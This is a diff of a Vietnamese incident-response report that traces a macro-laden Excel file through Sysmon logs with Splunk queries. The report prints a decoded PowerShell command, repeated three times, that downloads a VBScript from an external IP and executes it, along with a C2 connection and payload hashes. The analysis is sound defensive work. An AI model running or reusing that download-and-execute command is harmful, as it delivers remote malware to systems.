@@ -167,9 +167,9 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 Từ 2025-03-21 15:08:55 đến 2025-03-21 15:15:27, sau khi user click vào tệp Financial Records.xslsm chứa macro, Excel.exe khởi chạy và sau đó spawn ra 3 process cmd.exe thực thi một lệnh powershell. Lệnh này decode base64 và thực thi một đoạn powershell với cửa sổ ẩn (-w Hidden) và bỏ qua việc nạp profile powershell (-NoP). Lần lượt decode 3 lệnh sử dụng cyberchef:
 
 ```powershell
-Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
+Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
 
-Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
+Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
 
 Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 ```
@@ -244,15 +244,6 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 ![alt text](images/image-1.png)
 Thống kê các event sysmon liên quan đến process này trong khoảng thời gian thực thi
 
-
-```spl
-index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 EventCode=3
-| table _time SourceIp SourcePort DestinationIp DestinationPort
-```
-![alt text](./images/c2.png)
-
-Vào 2025-03-21 15:15:31,  ghi nhận Wscript.exe (1848) thực hiện kết nối tới external IP là 54.93.105.22 trên port 80 (giao thức HTTP) nhằm trà trộn vào traffic thông thường
-
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 EventCode=29
 | table _time TargetFilename Hashes
@@ -265,9 +256,13 @@ Hash của WindowsUpdaterFX.dll:
 - MD5=735AB5713DB79516CF350265FA7574E5
 - SHA256=9A02357D3091379C4A9568F6427C45554E48DAA910CF2F7BD871A9CF7F7B2CB4
 
-Kết hợp với sự kiện kết nối tới externel IP quan sát được vừa rồi, nhiều khả năng payload này được tải từ 54.93.105.22:80
+```spl
+index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 EventCode=3
+| table _time SourceIp SourcePort DestinationIp DestinationPort
+```
+![alt text](./images/c2.png)
 
-
+Vào 2025-03-21 15:15:31,  ghi nhận Wscript.exe (1848) thực hiện kết nối tới external IP là 54.93.105.22 trên port 80 (giao thức HTTP) nhằm trà trộn vào traffic thông thường
 
 ### 1.5 Process regsvr32.exe (PID = 8592) – khởi chạy bởi WScript.exe (PID = 1848) vào 2025-03-21 15:15:34
 
